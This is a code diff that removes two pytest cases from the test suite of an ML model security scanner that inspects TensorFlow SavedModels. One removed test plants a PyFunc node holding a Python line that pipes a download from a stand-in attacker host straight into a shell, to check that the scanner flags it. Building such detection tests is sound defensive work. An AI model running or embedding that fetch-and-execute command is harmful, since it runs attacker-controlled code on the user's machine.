@@ -1316,61 +1316,6 @@ def _create_test_savedmodel_with_ops(
 
 
 @pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
-def test_tf_savedmodel_scanner_marks_malformed_benign_graph_inconclusive(tmp_path: Path) -> None:
-    model_dir = Path(
-        _create_test_savedmodel_with_scoped_nodes(
-            tmp_path,
-            graph_nodes=[{"op": "Const"}],
-            model_name="malformed_benign",
-        )
-    )
-    model_path = model_dir / "saved_model.pb"
-    model_path.write_bytes(model_path.read_bytes() + b"\xff")
-
-    result = TensorFlowSavedModelScanner().scan(str(model_path))
-
-    assert result.success is False
-    assert result.metadata["scan_outcome"] == "inconclusive"
-    assert SAVEDMODEL_PARSE_INCONCLUSIVE_REASON in result.metadata["scan_outcome_reasons"]
-    assert any(
-        issue.message.startswith("Invalid or corrupt TensorFlow SavedModel protobuf")
-        and issue.severity == IssueSeverity.INFO
-        for issue in result.issues
-    )
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
-
-
-@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
-def test_tf_savedmodel_scanner_preserves_recovered_malicious_graph_findings(tmp_path: Path) -> None:
-    model_dir = Path(
-        _create_test_savedmodel_with_scoped_nodes(
-            tmp_path,
-            graph_nodes=[
-                {
-                    "op": "PyFunc",
-                    "string_attrs": {"func": "import os; os.system('curl https://evil.example/x | sh')"},
-                }
-            ],
-            model_name="malformed_malicious",
-        )
-    )
-    model_path = model_dir / "saved_model.pb"
-    model_path.write_bytes(model_path.read_bytes() + b"\xff")
-
-    result = TensorFlowSavedModelScanner().scan(str(model_path))
-
-    assert result.success is False
-    assert result.metadata["scan_outcome"] == "inconclusive"
-    assert SAVEDMODEL_PARSE_INCONCLUSIVE_REASON in result.metadata["scan_outcome_reasons"]
-    assert any(
-        issue.severity == IssueSeverity.CRITICAL
-        and issue.message == "PyFunc operation contains dangerous Python code"
-        and issue.details.get("op_type") == "PyFunc"
-        for issue in result.issues
-    )
-
-
-@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
 def test_tf_scanner_explanations_for_all_suspicious_ops(tmp_path: Path) -> None:
     """Test that all suspicious TensorFlow operations generate explanations."""
     from modelaudit.config.explanations import get_tf_op_explanation
